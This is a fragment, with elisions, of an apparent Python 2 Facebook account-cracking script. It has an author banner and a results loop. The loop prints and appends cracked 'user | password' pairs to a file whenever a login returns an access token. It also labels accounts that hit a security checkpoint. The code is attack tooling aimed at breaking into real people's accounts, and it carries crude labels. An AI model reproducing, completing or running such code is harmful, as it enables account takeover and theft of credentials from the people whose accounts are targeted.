...
def menu():
    ...
    print '\x1b[1;92mAUTHOR  : JOY ChowdhurY'
    print '\x1b[1;92mFACEBOOK  : CHOWDHURY'
    print '\x1b[1;92mGITHUB  : github.com/JOY420'
    print ''
    print 50* '-'
    print '\x1b[1;94m--------------------------------------------------'
    print
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[JIDAN Er Heda-ok]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[Sexy-Jidan-Cp]\x1b[1;97m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m[Login 7 Days]\x1b[0m \n'
